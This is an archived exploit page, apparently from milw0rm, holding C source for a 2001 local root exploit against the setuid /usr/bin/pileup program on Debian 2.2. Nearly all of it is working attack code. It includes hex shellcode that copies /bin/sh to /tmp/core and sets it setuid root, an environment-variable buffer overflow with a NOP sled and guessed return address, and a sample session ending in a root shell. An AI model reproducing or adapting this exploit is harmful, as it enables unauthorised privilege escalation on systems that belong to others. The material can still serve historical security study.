<html><head><title>Debian 2.2 /usr/bin/pileup Local Root Exploit</title></head><pre>/* pileup-xpl.c - local root exploit
 *
 * by core
 *
 * Friday the 13th, July 2001
 *
 * based almost entirely on code by Cody Tubbs (loophole of hhp)
 *
 * $ ./pileup-xpl
 * pileup-xpl by core 2001 - beep beep root!
 * usage: ./pileup-xpl [offset] [align(0..3)]
 * Ret-addr: 0xbfffe09c, offset: 0, align: 0.
 * How many voices (1 to 9)
 * Starting speed (wpm)
 * (C)ompetion mode or (P)ractice mode
 * Enter '0' to abort the session! GL..
 *
 * TX              RX         TX           RX
 * --              --         --           --
 *
 * Accuracy: 0/6. Max speed: 13
 * Score: 0
 * Score: core wins!
 * core-2.03# id
 * uid=1000(core) gid=1000(core) euid=0(root) groups=1000(core)
 * core-2.03# exit
 * $
 *
 * greetz b10z, hhp, loophole
 *
 */
#include &lt;stdio.h&gt; 
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

#define SH_IS_BASH 1 /* if /bin/sh -&gt; /bin/bash */

#define PATH   &quot;/usr/bin/pileup&quot;  // Change to direct path if needed. 
#define OFFSET 0                  // Worked for me. 
#define ALIGN  0                  // Don't change. 
#define NOP    0x90               // x86 No OPeration. 
#define DBUF   20                 // 16+4(ebp)+4(eip)=24. 
#define DAT    &quot;calls.dat&quot;        // Required for exploitation. 
 
static char shellcode[]=
&quot;\x31\xc0&quot; /* set[gu]id(0);/bin/cp /bin/sh /tmp/core;chmod 4555 /tmp/core */
&quot;\x31\xdb\xb0\x17\xcd\x80\x66\x31\xc0\x66\x31\xdb\xb0\x2e\xcd\x80&quot;
&quot;\xeb\x5e\x5f\x31\xc0\x88\x47\x07\x88\x47\x0f\x88\x47\x19\x89\x7f&quot;
&quot;\x1a\x8d\x77\x08\x89\x77\x1e\x31\xf6\x8d\x77\x10\x89\x77\x22\x89&quot;
&quot;\x47\x26\x89\xfb\x8d\x4f\x1a\x8d\x57\x26\x31\xc0\xb0\x02\xcd\x80&quot;
&quot;\x31\xf6\x39\xc6\x75\x06\xb0\x0b\xcd\x80\xeb\x1d\x31\xd2\x31\xc0&quot;
&quot;\x31\xdb\x4b\x8d\x4f\x26\xb0\x07\xcd\x80\x31\xc0\x8d\x5f\x10\x31&quot;
&quot;\xc9\x66\xb9\x6d\x09\xb0\x0f\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80&quot;
&quot;\xe8\x9d\xff\xff\xff/bin/cp8/bin/sh8/tmp/core&quot;;

long get_sp(void) {
   __asm__(&quot;movl %esp,%eax&quot;);
} 
 
void usage(char *name){ 
   fprintf(stderr, &quot;pileup-xpl by core 2001 - beep beep root!\n&quot;);
   fprintf(stderr, &quot;usage: %s [offset] [align(0..3)]\n&quot;, name);
}
 
int main(int argc, char **argv){ 
   char eipeip[DBUF], buffer[7192]; 
   char go[DBUF + 22]; 
   FILE *calls; 
   int i, offset, align; 
   long address;

   usage(argv[0]);

   /* Remove the config and write OWNED! */
   unlink(DAT);
   calls = fopen(DAT, &quot;w&quot;);
   fprintf(calls, &quot;OWNED\n&quot;);
   fclose(calls);

   /* Do command line */
   if (argc &gt; 1) {
      offset = atoi(argv[1]);
   }
   else {
      offset = OFFSET;
   } 

   if (argc &gt; 2) { 
      align = atoi(argv[2]);
   } 
   else { 
      align = ALIGN;
   } 

   address = get_sp() - offset;
 
   if (align &gt; 0) {
      for(i=0; i &lt; align; i++) {
	 eipeip[i] = 0x69;
      }
   }
 
   for (i=align; i &lt; DBUF; i+=4) {
      *(long *)&amp;eipeip[i] = address;
   } 
   for (i=0; i &lt; (7192 - strlen(shellcode) - strlen(eipeip)); i++) {
      buffer[i] = NOP;
   }

   /* setup the environment */
   memcpy(buffer + i, shellcode, strlen(shellcode)); 
   memcpy(buffer, &quot;UPEX=&quot;, 5);
   putenv(buffer);
   
   fprintf(stderr, &quot;Ret-addr: %#x, offset: %d, align: %d.\n&quot;, address, \
	   offset, align); 

   sprintf(go, &quot;(printf '1\n0\nC\n%s\n0\n')|%s&quot;, eipeip, PATH); //netcat style.
   system(go);

   fprintf(stderr, &quot;Score: core wins!\n&quot;);
   
#ifdef SH_IS_BASH   
   system(&quot;/tmp/core -p&quot;);
#else
   system(&quot;/tmp/core&quot;);
#endif

   return 0;
} 

// milw0rm.com [2001-07-13]</pre></html>